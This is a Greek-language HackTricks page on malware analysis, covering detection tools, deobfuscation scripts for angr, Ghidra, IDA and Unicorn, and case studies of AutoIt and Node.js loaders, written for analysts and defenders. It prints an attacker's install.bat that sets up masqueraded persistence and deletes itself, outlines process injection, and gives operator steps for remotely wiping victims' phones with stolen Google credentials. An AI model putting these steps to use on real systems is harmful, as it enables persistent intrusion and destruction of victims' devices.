# Ανάλυση Malware

{{#include ../../banners/hacktricks-training.md}}

## CheatSheets για Forensics

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Διαδικτυακές υπηρεσίες

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Εργαλεία Antivirus και ανίχνευσης εκτός σύνδεσης

### Yara

#### Εγκατάσταση
```bash
sudo apt-get install -y yara
```
#### Προετοιμασία κανόνων

Χρησιμοποιήστε αυτό το script για να κατεβάσετε και να συγχωνεύσετε όλους τους yara malware κανόνες από το github: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Δημιουργήστε τον φάκελο _**rules**_ και εκτελέστε το. Αυτό θα δημιουργήσει ένα αρχείο με όνομα _**malware_rules.yar**_ το οποίο περιέχει όλους τους yara κανόνες για malware.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Σάρωση
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: Έλεγχος για malware και Δημιουργία κανόνων

Μπορείτε να χρησιμοποιήσετε το εργαλείο [**YaraGen**](https://github.com/Neo23x0/yarGen) για να δημιουργήσετε yara rules από ένα binary. Δείτε αυτούς τους οδηγούς: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Εγκατάσταση
```
sudo apt-get install -y clamav
```
#### Σάρωση
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** εντοπίζει ενδεχομένως κακόβουλες **δυνατότητες** σε εκτελέσιμα: PE, ELF, .NET. Έτσι θα βρει πράγματα όπως Att\&ck tactics, ή ύποπτες δυνατότητες όπως:

- έλεγχος για σφάλμα OutputDebugString
- εκτέλεση ως υπηρεσία
- δημιουργία process

Βρες το στο [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC σημαίνει Indicator Of Compromise. Ένα IOC είναι ένα σύνολο **συνθηκών που αναγνωρίζουν** κάποιο πιθανώς ανεπιθύμητο λογισμικό ή επιβεβαιωμένο **malware**. Οι Blue Teams χρησιμοποιούν αυτόν τον τύπο ορισμού για να **αναζητήσουν αυτού του είδους τα κακόβουλα αρχεία** στα **συστήματα** και τα **δίκτυα** τους.\
Η κοινή χρήση αυτών των ορισμών είναι πολύ χρήσιμη, καθώς όταν το malware εντοπιστεί σε έναν υπολογιστή και δημιουργηθεί ένα IOC για αυτό, άλλες Blue Teams μπορούν να το χρησιμοποιήσουν για να αναγνωρίσουν το malware πιο γρήγορα.

Ένα εργαλείο για τη δημιουργία ή τροποποίηση IOCs είναι [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
Μπορείτε να χρησιμοποιήσετε εργαλεία όπως [**Redline**](https://www.fireeye.com/services/freeware/redline.html) για να **αναζητήσετε ορισμένα IOCs σε μια συσκευή**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) είναι ένας scanner για Simple Indicators of Compromise.\
Η ανίχνευση βασίζεται σε τέσσερις μεθόδους ανίχνευσης:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) είναι ένας ανιχνευτής malware για Linux που κυκλοφορεί υπό την άδεια GNU GPLv2, σχεδιασμένος με γνώμονα τις απειλές που αντιμετωπίζονται σε περιβάλλοντα κοινής φιλοξενίας. Χρησιμοποιεί δεδομένα απειλών από συστήματα ανίχνευσης εισβολών στο όριο του δικτύου για να εξάγει malware που χρησιμοποιείται ενεργά σε επιθέσεις και δημιουργεί υπογραφές για τον εντοπισμό. Επιπλέον, τα δεδομένα απειλών προέρχονται επίσης από υποβολές χρηστών μέσω της δυνατότητας checkout του LMD και από πόρους της κοινότητας malware.

### rkhunter

Εργαλεία όπως [**rkhunter**](http://rkhunter.sourceforge.net) μπορούν να χρησιμοποιηθούν για να ελέγξουν το σύστημα αρχείων για πιθανά **rootkits** και malware.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) είναι ένα εργαλείο που θα προσπαθήσει να εντοπίσει obfuscated strings μέσα σε εκτελέσιμα χρησιμοποιώντας διάφορες τεχνικές.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) ελέγχει κάποια βασικά πράγματα μέσα στο εκτελέσιμο (binary data, entropy, URLs and IPs, some yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) είναι ένα εργαλείο που επιτρέπει την απόκτηση πληροφοριών για Windows executables όπως imports, exports, headers, αλλά επίσης θα ελέγξει virus total και θα βρει potential Att\&ck techniques.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) είναι ένα εργαλείο για να ανιχνεύει αν ένα αρχείο είναι **encrypted** και επίσης να εντοπίζει **packers**.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI) είναι ένα Python script που χρησιμοποιεί ποικιλία από **statistical methods** για να ανιχνεύσει **obfuscated** και **encrypted** περιεχόμενο μέσα σε αρχεία text/script. Ο σκοπός του NeoPI είναι να βοηθήσει στην **detection of hidden web shell code**.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) κάνει το καλύτερο δυνατό για να ανιχνεύσει **obfuscated**/**dodgy code** καθώς και αρχεία που χρησιμοποιούν **PHP** functions που συχνά χρησιμοποιούνται σε **malwares**/webshells.

### Apple Binary Signatures

Όταν ελέγχετε κάποιο **malware sample** θα πρέπει πάντα να **check the signature** του binary καθώς ο **developer** που το υπέγραψε μπορεί να είναι ήδη **related** με **malware.**
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Detection Techniques

### File Stacking

Αν γνωρίζετε ότι κάποιος φάκελος που περιέχει τα **files** ενός web server **ενημερώθηκε τελευταία σε κάποια ημερομηνία**. **Ελέγξτε** την **ημερομηνία** που όλα τα **files** στον **web server δημιουργήθηκαν και τροποποιήθηκαν** και αν κάποια ημερομηνία είναι **ύποπτη**, ελέγξτε εκείνο το αρχείο.

### Baselines

Αν τα αρχεία ενός φακέλου **δεν έπρεπε να είχαν τροποποιηθεί**, μπορείτε να υπολογίσετε το **hash** των **original files** του φακέλου και να τα **συγκρίνετε** με τα **current**. Οτιδήποτε τροποποιημένο θα είναι **ύποπτο**.

### Statistical Analysis

Όταν οι πληροφορίες αποθηκεύονται σε logs μπορείτε να **ελέγξετε στατιστικά όπως πόσες φορές κάθε αρχείο του web server προσπελάστηκε**, καθώς ένα web shell μπορεί να είναι από τα πιο προσπελασμένα.

---

### Android in-app native telemetry (no root)

Στο Android, μπορείτε να instrument native code μέσα στη διεργασία της στοχευόμενης εφαρμογής προφορτώνοντας μια μικρή βιβλιοθήκη logger πριν αρχικοποιηθούν άλλες JNI libs. Αυτό δίνει πρώιμη ορατότητα στη native συμπεριφορά χωρίς system-wide hooks ή root. Μια δημοφιλής προσέγγιση είναι το SoTap: τοποθετήστε το libsotap.so για το σωστό ABI μέσα στο APK και εισάγετε ένα System.loadLibrary("sotap") κάλεσμα νωρίς (π.χ., static initializer ή Application.onCreate), στη συνέχεια συλλέξτε logs από εσωτερικές/εξωτερικές διαδρομές ή χρησιμοποιήστε fallback στο Logcat.

See the Android native reversing page for setup details and log paths:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Κάποιο Android malware και εφαρμογές προστατευμένες με RASP κρύβουν ονόματα μεθόδων JNI και signatures αποκωδικοποιώντας τα κατά το runtime πριν καλέσουν το RegisterNatives. Όταν η instrumentation με Frida/ptrace τερματίζεται από anti-debug, μπορείτε ακόμα να ανακτήσετε το plaintext offline εκτελώντας τον in-binary decoder με angr και στη συνέχεια προωθώντας τα αποτελέσματα πίσω στο Ghidra ως σχόλια.

Key idea: treat the decoder inside the .so as a callable function, execute it on the obfuscated byte blobs in .rodata, and concretize the output bytes up to the first \x00 (C-string terminator). Keep angr and Ghidra using the same image base to avoid address mismatches.

Workflow overview
- Triage in Ghidra: identify the decoder and its calling convention/arguments in JNI_OnLoad and RegisterNatives setup.
- Run angr (CPython3) to execute the decoder for each target string and dump results.
- Annotate in Ghidra: auto-comment decoded strings at each call site for fast JNI reconstruction.

Ghidra triage (JNI_OnLoad pattern)
- Apply JNI datatypes to JNI_OnLoad so Ghidra recognises JNINativeMethod structures.
- Typical JNINativeMethod per Oracle docs:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Look for calls to RegisterNatives. If the library constructs the name/signature with a local routine (e.g., FUN_00100e10) that references a static byte table (e.g., DAT_00100bf4) and takes parameters like (encoded_ptr, out_buf, length), that is an ideal target for offline execution.

angr setup (execute the decoder offline)
- Load the .so with the same base used in Ghidra (example: 0x00100000) and disable auto-loading of external libs to keep the state small.

<details>
<summary>angr setup και offline εκτέλεση του decoder</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- Σε μεγάλη κλίμακα, δημιουργήστε έναν στατικό χάρτη από τα σημεία κλήσης προς τις παραμέτρους του decoder (encoded_ptr, size). Οι wrappers μπορεί να κρύβουν παραμέτρους, οπότε μπορείτε να δημιουργήσετε αυτήν τη χαρτογράφηση χειροκίνητα από τα Ghidra xrefs αν το API recovery παράγει θόρυβο.

<details>
<summary>Μαζική αποκωδικοποίηση πολλαπλών σημείων κλήσης με angr</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Επισήμανση σημείων κλήσης στο Ghidra
Option A: Jython-only comment writer (use a pre-computed JSON)
- Since angr requires CPython3, keep deobfuscation and annotation separated. First run the angr script above to produce decoded_strings.json. Then run this Jython GhidraScript to write PRE_COMMENTs at each call site (and include the caller function name for context):

<details>
<summary>Ghidra Jython script για επισημείωση αποκωδικοποιημένων JNI strings</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Επιλογή B: Single CPython script via pyhidra/ghidra_bridge
- Εναλλακτικά, χρησιμοποιήστε pyhidra ή ghidra_bridge για να χειριστείτε την Ghidra’s API από την ίδια CPython διεργασία που τρέχει angr. Αυτό επιτρέπει να καλείτε decode_string() και αμέσως να ορίζετε PRE_COMMENTs χωρίς ενδιάμεσο αρχείο. Η λογική αντικατοπτρίζει το Jython script: κατασκευάστε χάρτη callsite→function μέσω ReferenceManager, κάντε decode με angr, και ορίστε τα σχόλια.

Γιατί λειτουργεί αυτό και πότε να το χρησιμοποιήσετε
- Offline εκτέλεση παρακάμπτει RASP/anti-debug: δεν απαιτείται ptrace ή Frida hooks για να ανακτηθούν τα strings.
- Η διατήρηση των Ghidra και angr base_addr ευθυγραμμισμένων (π.χ., 0x00100000) εξασφαλίζει ότι οι διευθύνσεις συνάρτησης/δεδομένων ταιριάζουν μεταξύ των εργαλείων.
- Επαναλαμβανόμενη συνταγή για decoders: αντιλαμβανόμαστε το transform ως καθαρή συνάρτηση, δεσμεύουμε έναν output buffer σε ένα φρέσκο state, τον καλούμε με (encoded_ptr, out_ptr, len), στη συνέχεια concretize μέσω state.solver.eval και κάνουμε parse C-strings μέχρι το \x00.

Σημειώσεις και παγίδες
- Σεβαστείτε το target ABI/calling convention. angr.factory.callable επιλέγει ένα βάσει arch; αν τα arguments φαίνονται μετατοπισμένα, καθορίστε cc ρητά.
- Αν ο decoder περιμένει μηδενισμένους output buffers, αρχικοποιήστε το outbuf με zeros στο state πριν την κλήση.
- Για position-independent Android .so, δώστε πάντα base_addr ώστε οι διευθύνσεις στο angr να ταιριάζουν με αυτές που βλέπετε στην Ghidra.
- Χρησιμοποιήστε currentProgram.getReferenceManager() για να απαριθμήσετε call-xrefs ακόμα κι αν η εφαρμογή τυλίγει τον decoder πίσω από thin stubs.

Για angr basics, δείτε: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Αποκωδικοποίηση της Δυναμικής Ροής Ελέγχου (JMP/CALL RAX Dispatchers)

Σύγχρονες οικογένειες malware κάνουν εκτεταμένη κατάχρηση της Control-Flow Graph (CFG) obfuscation: αντί για ένα απευθείας jump/call, υπολογίζουν τον προορισμό σε run-time και εκτελούν `jmp rax` ή `call rax`. Ένας μικρός *dispatcher* (τυπικά εννέα εντολές) ορίζει τον τελικό στόχο ανάλογα με τα CPU `ZF`/`CF` flags, καταστρέφοντας πλήρως την στατική ανάκτηση του CFG.

Η τεχνική – επιδεικνυόμενη από τον SLOW#TEMPEST loader – μπορεί να ηττηθεί με ένα workflow τριών βημάτων που βασίζεται μόνο σε IDAPython και τον Unicorn CPU emulator.

### 1. Εντοπίστε κάθε έμμεσο άλμα / κλήση
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Εξαγάγετε το dispatcher byte-code
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Εξομοιώστε το δύο φορές με Unicorn
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Τρέξτε `run(code,0,0)` και `run(code,1,1)` για να λάβετε τους στόχους των *false* και *true* κλάδων.

### 4. Αποκατάσταση ενός direct jump / call
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Μετά το patching, αναγκάστε το IDA να επαναναλύσει τη συνάρτηση ώστε το πλήρες CFG και το Hex-Rays output να αποκατασταθούν:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Επισήμανση έμμεσων κλήσεων API

Μόλις ο πραγματικός προορισμός κάθε `call rax` γίνει γνωστός, μπορείτε να πείτε στο IDA τι είναι, ώστε οι τύποι παραμέτρων και τα ονόματα μεταβλητών να ανακτηθούν αυτόματα:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Πρακτικά οφέλη

* Επαναφέρει το πραγματικό CFG → η decompilation πάει από *10* γραμμές σε χιλιάδες.
* Ενεργοποιεί string-cross-reference & xrefs, κάνοντας την ανακατασκευή της συμπεριφοράς εύκολη.
* Τα scripts είναι επαναχρησιμοποιήσιμα: ρίξτε τα σε οποιονδήποτε loader προστατευμένο με το ίδιο trick.

---

## AutoIt-based loaders: .a3x decryption, Task Scheduler masquerade και RAT injection

Αυτό το πρότυπο εισβολής αλυσσοδένει ένα υπογεγραμμένο MSI, AutoIt loaders μεταγλωττισμένους σε .a3x, και ένα Task Scheduler job που μιμείται μια αβλαβή εφαρμογή.

### MSI → custom actions → AutoIt orchestrator

Δέντρο διεργασιών και εντολές που εκτελούνται από τα custom actions του MSI:

- MsiExec.exe → cmd.exe to run install.bat
- WScript.exe για να εμφανίσει ένα παραπλανητικό παράθυρο σφάλματος
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (αποθέτει loader, ρυθμίζει persistence, αυτοκαθαρίζεται):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (δόλωμα χρήστη):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Key artifacts and masquerade:
- Αποθέτει AutoIt3.exe και IoKlTr.au3 στο C:\Users\Public\Music
- Αντιγράφει schtasks.exe σε hwpviewer.exe (μασκαρεύεται ως Hangul Word Processor viewer)
- Δημιουργεί ένα scheduled task "IoKlTr" που εκτελείται κάθε 1 λεπτό
- Startup LNK εμφανίζεται ως Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Τοποθετεί modules κάτω από %APPDATA%\Google\Browser\ υποφακέλους που περιέχουν `adb` ή `adv` και τα ξεκινά μέσω autoit.vbs/install.bat βοηθητικών αρχείων

Forensic triage tips:
- Καταγραφή με schtasks: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Αναζητήστε μετονομασμένα αντίγραφα του schtasks.exe που βρίσκονται μαζί με Task XML: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Συνήθεις διαδρομές: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Συσχετίστε τη δημιουργία διεργασιών: AutoIt3.exe που spawn νόμιμα Windows binaries (π.χ., cleanmgr.exe, hncfinder.exe)

### AutoIt loaders and .a3x payload decryption → injection

- Τα AutoIt modules είναι compiled με `#AutoIt3Wrapper_Outfile_type=a3x` και decrypt τα embedded payloads πριν από το injection σε benign processes.
- Παρατηρούμενες οικογένειες: QuasarRAT (injected into hncfinder.exe) και RftRAT/RFTServer (injected into cleanmgr.exe), καθώς και RemcosRAT modules (`Remcos\RunBinary.a3x`).
- Decryption pattern: παράγεται ένα AES key μέσω HMAC, decrypt το embedded blob, και μετά inject το plaintext module.

Γενικός σκελετός αποκρυπτογράφησης (το ακριβές HMAC input/algorithm εξαρτάται από την οικογένεια):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Συνηθισμένη ροή injection (CreateRemoteThread-style):
- CreateProcess (suspended) του στοχευόμενου host (π.χ., cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory με αποκρυπτογραφημένο module/shellcode
- CreateRemoteThread or QueueUserAPC για εκτέλεση του payload

Ιδέες ανίχνευσης
- AutoIt3.exe που έχει ως parent το MsiExec.exe ή το WScript.exe και εκκινεί εργαλεία συστήματος
- Αρχεία με `.a3x` επεκτάσεις ή AutoIt script runners κάτω από δημόσιες/εγγράψιμες από τον χρήστη διαδρομές
- Υποπτες scheduled tasks που εκτελούν AutoIt3.exe ή binaries μη υπογεγραμμένα από τη Microsoft, με triggers σε επίπεδο λεπτών

### Κατάληψη λογαριασμού μέσω Android Find My Device (Find Hub)

Κατά τη διάρκεια της εισβολής σε Windows, οι operators χρησιμοποίησαν κλεμμένα Google credentials για να σβήσουν επανειλημμένα τις Android συσκευές του θύματος, καταστέλλοντας τις ειδοποιήσεις ενώ επεκτείναν την πρόσβαση μέσω του desktop messenger στο οποίο ήταν συνδεδεμένο το θύμα.

Βήματα operator (από μια συνδεδεμένη συνεδρία browser):
- Ανοίξτε Google Account → Security → Your devices; ακολουθήστε Find My Phone → Find Hub (https://www.google.com/android/find)
- Επιλέξτε συσκευή → εισάγετε ξανά τον Google κωδικό → εκτελέστε "Erase device" (factory reset); επαναλάβετε για να καθυστερήσετε την ανάκτηση
- Προαιρετικά: διαγράψτε τα alert e-mails στο συνδεδεμένο mailbox (π.χ., Naver) για να αποκρύψετε ειδοποιήσεις ασφαλείας

## Ιχνηλάτηση έντονα obfuscated Node.js loaders

Οι επιτιθέμενοι όλο και περισσότερο πακετάρουν JavaScript loaders μέσα σε standalone Windows binaries compiled με [`nexe`](https://github.com/nexe/nexe), έτσι το runtime συνοδεύει το script. Το προκύπτον PE συχνά ζυγίζει 60–90 MB και εκτελείται ακόμη κι αν το Node.js δεν είναι εγκατεστημένο. Κατά το triage:

- Χρησιμοποιήστε [`nexe_unpacker`](https://npm.io/package/nexe_unpacker) για να εξάγετε το ενσωματωμένο JavaScript από το PE και να το δώσετε στα τοπικά εργαλεία για στατική σύγκριση διαφορών.
- Αναμένετε ένα disk-based mutex στο %TEMP% (GachiLoader drops a random `<name>.lock` file που λήγει μετά από ~5 λεπτά). Η αντιγραφή του αρχείου στο sandbox πριν την εκτέλεση σας επιτρέπει να παραλείψετε επαναλαμβανόμενα στάδια ενώ εξακολουθείτε να βλέπετε τα μεταγενέστερα payloads.

### Node.js API tracing για παράκαμψη anti-analysis

Check Point’s [Nodejs-Tracer](https://github.com/CheckPointSW/Nodejs-Tracer) ενσωματώνει hooks σε core modules μέσα σε οποιαδήποτε Node.js process, σας επιτρέπει να spoofάρετε anti-VM probes και διατηρεί κάθε artifact που γράφει το δείγμα. Εκκινήστε obfuscated scripts μέσω του tracer για να κρατήσετε analyst-controlled instrumentation στο call stack:
```powershell
node -r .\tracer.js main.js
```
Βασικοί διακόπτες ρύθμισης στο `tracer.js` σας επιτρέπουν να:

- Καταγράψετε filesystem, child-process και HTTP δραστηριότητα (`LOG_HTTP_REQUESTS`, `SAVE_FILE_WRITES`). Κάθε αρχείο που απορρίπτεται — όπως το `kidkadi.node` — αντιγράφεται στον working directory πριν το malware το διαγράψει.
- Υπερκαλύψετε fingerprints του περιβάλλοντος επιστρέφοντας ρεαλιστικούς αριθμούς RAM/CPU, παραποιώντας το `tasklist` output και αλλοιώνοντας τις απαντήσεις PowerShell/WMI. Αυτό παρακάμπτει loaders που απαιτούν ≥4 GB RAM, ≥2 cores, και ελέγχουν με προσοχή user names (`mashinesssss`, `wdagutilityaccount`, κ.ά.), hostnames (`desktop-vrsqlag`, `server1` …) και process names (`vmtoolsd.exe`, `fiddler.exe`, `x64dbg.exe`, `frida-server.exe`).
- Αδρανοποιήσετε ελέγχους υλικού μέσω WMI όπως `Get-WmiObject Win32_DiskDrive` (αναζήτηση για `vmware`, `kvm`, `virtio`, …), `Win32_VideoController` (εμπόδιση “VirtualBox Graphics Adapter”, “Hyper-V Video”, κ.λπ.) και μετρήσεις `Win32_PortConnector`. Όταν αυτές οι διερευνήσεις αναφέρουν “πραγματικό” hardware, τα sandboxes δεν μπαίνουν πλέον σε άπειρο loop με benign `Invoke-WebRequest` κλήσεις σε `linkedin.com`, `grok.com`, `whatsapp.com` και παρόμοια domains που χρησιμοποιεί το GachiLoader για να σπαταλήσει χρόνο ανάλυσης.

### Αυτόματη κατανάλωση / καταγραφή προστατευμένης C2 κίνησης

Τα network hooks του tracer αποκαλύπτουν multi-layer C2 authentication χωρίς να χρειάζεται να αντιστραφεί η JavaScript obfuscation. Στην παρατηρούμενη καμπάνια ο loader:

1. POSTάει host telemetry στο `/log` σε κάθε hard-coded C2.
2. Κάνει `GET /richfamily/<per-sample key>` με `X-Secret: gachifamily` για να ανακτήσει ένα Base64-encoded payload URL.
3. Εκτελεί ένα τελικό `GET` σε εκείνο το URL με ένα μεγάλο per-sample `X-Secret` header· αν λείπει, επιστρέφεται `403 Forbidden`.

Επειδή ο tracer καταγράφει πλήρως τα requests (headers, bodies, destinations), μπορείτε να replay-άρετε την ίδια κίνηση για να τραβήξετε payloads, να dumpάρετε Themida/VMProtect shells στη μνήμη και να εξάγετε μαζικά configuration δεδομένα του Rhadamanthys.

## AdaptixC2: Configuration Extraction and TTPs

Δείτε την αφιερωμένη σελίδα:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## Αναφορές

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
